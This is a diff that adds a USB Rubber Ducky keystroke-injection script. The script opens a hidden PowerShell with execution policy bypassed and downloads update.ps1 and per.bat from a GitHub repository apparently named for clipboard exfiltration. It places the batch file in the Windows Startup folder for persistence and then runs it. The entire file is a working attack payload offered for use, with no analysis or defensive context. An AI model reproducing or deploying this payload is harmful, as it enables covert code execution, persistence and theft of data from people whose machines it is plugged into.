@@ -1,0 +1,13 @@
+DELAY 1000
+GUI r
+DELAY 1000
+STRING powershell.exe
+ENTER
+DELAY 1000
+STRING powershell -w h -NoP -NonI -Ep Bypass 'Invoke-WebRequest -Uri "https://raw.githubusercontent.com/offport/ClipbpardExfiltration/main/update.ps1" -OutFile "$env:userprofile\AppData\Roaming\update.ps1" -UseBasicParsing';
+DELAY 1000
+STRING powershell -w h -NoP -NonI -Ep Bypass 'Invoke-WebRequest -Uri "https://raw.githubusercontent.com/offport/ClipbpardExfiltration/main/per.bat" -OutFile "$env:APPDATA\Microsoft\Windows\Start` Menu\Programs\Startup\per.bat" -UseBasicParsing';
+DELAY 1000
+STRING Invoke-Expression -Command "& '$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\per.bat'" 
+DELAY 1000
+ENTER
